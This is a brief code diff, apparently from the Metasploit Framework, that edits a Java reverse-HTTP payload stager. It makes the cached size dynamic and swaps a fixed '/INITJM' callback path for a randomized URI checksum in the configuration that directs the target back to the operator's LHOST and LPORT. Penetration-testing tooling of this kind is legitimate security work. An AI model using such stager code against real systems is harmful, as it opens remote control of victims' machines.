@@ -8,7 +8,7 @@ require 'msf/core/handler/reverse_http'
 
 module Metasploit3
 
-  CachedSize = 5500
+  CachedSize = :dynamic
 
   include Msf::Payload::Stager
   include Msf::Payload::Java
@@ -45,7 +45,9 @@ module Metasploit3
     c << "Spawn=#{spawn}\n"
     c << "URL=http://#{datastore["LHOST"]}"
     c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
-    c << "/INITJM\n"
+    c << "/"
+    c << generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITJ,30+rand(256-30))
+    c << "\n"
 
     c
   end
